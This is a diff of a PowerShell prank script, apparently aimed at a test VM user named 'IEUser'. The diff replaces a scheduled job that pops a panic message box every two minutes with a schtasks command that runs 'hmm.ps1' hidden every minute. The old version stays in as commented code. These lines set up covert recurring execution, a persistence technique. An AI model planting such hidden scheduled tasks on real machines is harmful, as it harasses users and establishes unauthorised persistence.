@@ -21,15 +21,19 @@ function CreateLocalUsers(){
     }
 }
 
-function AnnoyingAlert(){
-   #$timeinSec = New-TimeSpan -Seconds 120
-    $T = New-JobTrigger -Once -At (Get-Date) -RepeatIndefinitely -RepetitionInterval (New-TimeSpan -Seconds 120)
-        Register-ScheduledJob -Name "funky thingies" -Trigger $T -ScriptBlock {
-        powershell -WindowStyle hidden -Command "& {[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('WHAT IS HAPPENING?!?!','AAAAAAAHHHHHHHH')}"
-      }
-
-    #Register-ScheduledJob -Name "funky thingie" -RunEvery $timeinSec -FilePath C:\Users\IEUser\Documents\Scripts\hmm.ps1
+function TaskCreation(){
+    schtasks /create /tn myfunnyTask /tr "powershell -NoLogo -WindowStyle hidden -file hmm.ps1" /sc minute /mo 1 /ru IEUser
 }
+
+# function AnnoyingAlert(){
+#    #$timeinSec = New-TimeSpan -Seconds 120
+#         $trigger = New-JobTrigger -Once -At 2:33PM -RepetitionInterval (New-TimeSpan -minutes 2) -RepeatIndefinitely
+#         Register-ScheduledJob -Name "funky thingies" -Trigger $trigger -ScriptBlock {
+#         powershell -WindowStyle hidden -Command "& {[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('WHAT IS HAPPENING?!?!','AAAAAAAHHHHHHHH')}"
+#       }
+#      schtasks /create /tn testinggg /tr "powershell -Command ""&" {[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('WHAT IS HAPPENING?!?!','AAAAAAAHHHHHHHH')}"" /sc minute /mo 1 /ru IEUser
+#     #Register-ScheduledJob -Name "funky thingie" -RunEvery $timeinSec -FilePath C:\Users\IEUser\Documents\Scripts\hmm.ps1
+# }
 
 function SetMemeAliases()
 {
